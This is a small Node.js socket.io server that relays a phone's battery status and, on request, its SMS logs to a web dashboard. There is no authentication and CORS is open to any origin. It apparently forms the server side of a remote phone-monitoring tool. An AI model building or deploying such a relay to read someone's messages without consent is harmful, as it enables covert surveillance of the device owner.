const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

app.use(express.static(path.join(__dirname, 'public')));

io.on('connection', (socket) => {
    console.log('User connected:', socket.id);

    // Broadcast battery and charging state
    socket.on('battery-status', (data) => {
        socket.broadcast.emit('ui-battery', data);
    });

    // Request logs from phone
    socket.on('get-sms-request', () => {
        socket.broadcast.emit('get-sms-request');
    });

    // Receive and forward SMS logs
    socket.on('sms-data-log', (data) => {
        socket.broadcast.emit('ui-sms-display', data);
    });

    socket.on('disconnect', () => {
        socket.broadcast.emit('device-status', { online: false });
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
